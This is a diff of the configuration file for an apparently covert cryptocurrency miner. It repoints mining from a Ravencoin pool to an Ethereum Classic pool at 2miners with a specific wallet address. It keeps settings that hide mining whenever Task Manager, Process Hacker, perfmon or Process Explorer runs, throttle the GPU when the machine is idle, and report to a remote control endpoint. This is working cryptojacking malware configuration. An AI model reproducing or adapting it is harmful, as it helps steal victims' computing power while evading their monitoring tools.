@@ -1,11 +1,11 @@
 {
-    "url": "stratum://`testedilecek`.{COMPUTERNAME}:123456@rvn.poolbinance.com:9000",
-    "algo": "kawpow",
+    "url": "stratum://`0xce31bf75f361507717066ac18182de2bc7faec4c`.{COMPUTERNAME}:x@etc.2miners.com:1010",
+    "algo": "etchash",
     "max-gpu": 50,
     "idle-wait": 5,
     "idle-gpu": 50,
     "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
     "kill-targets": "",
     "stealth-fullscreen": false,
-	  "api-endpoint":"https://blackhole.software/arapavcisi/api/endpoint.php"
+    "api-endpoint":"https://blackhole.software/arapavcisi/api/endpoint.php"
 }
